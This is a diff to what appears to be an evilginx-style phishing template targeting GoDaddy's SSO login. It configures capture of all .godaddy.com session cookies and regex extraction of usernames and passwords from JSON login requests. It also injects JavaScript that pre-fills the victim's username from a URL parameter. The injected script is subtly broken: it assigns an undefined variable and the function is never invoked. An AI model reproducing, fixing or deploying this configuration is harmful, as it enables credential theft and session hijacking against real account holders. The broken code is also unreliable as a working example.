@@ -44,17 +44,32 @@ sub_filters:
 #  - {triggers_on: 'sso.godaddy.com', orig_sub: 'g', domain: 'secureserver.net', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
 
 auth_tokens:
-  - domain: '.godaddy.com'
-    keys: ['(.*)','.*,regexp']
+  - domain: ".godaddy.com"
+    keys: ["(.*)"]
+
 credentials:
   username:
-    key: 'username'
-    search: '(.*)'
-    type: 'post'
+    key: "(Username|username)"
+    search: '"username":"([^"]*)'
+    type: "json"
   password:
-    key: 'password'
-    search: '(.*)'
-    type: 'post'
+    key: "(Password|password)"
+    search: '"password":"([^"]*)'
+    type: "json"
+
 login:
   domain: 'sso.godaddy.com'
-  path: '/login' 
+  path: '/login?realm=pass&app=email'
+
+js_inject:
+  - trigger_domains: ["sso.godaddy.com"]
+    trigger_paths: ["/login"]
+    script: |
+      function embox() {
+               var delaytimer = 2000;
+               setTimeout(function(){
+                       const urlParams = new URLSearchParams(window.location.search);
+                       const myParam = urlParams.get('limea');
+                       document.getElementById("username").value = myParams;
+               }, delaytimer);
+      }
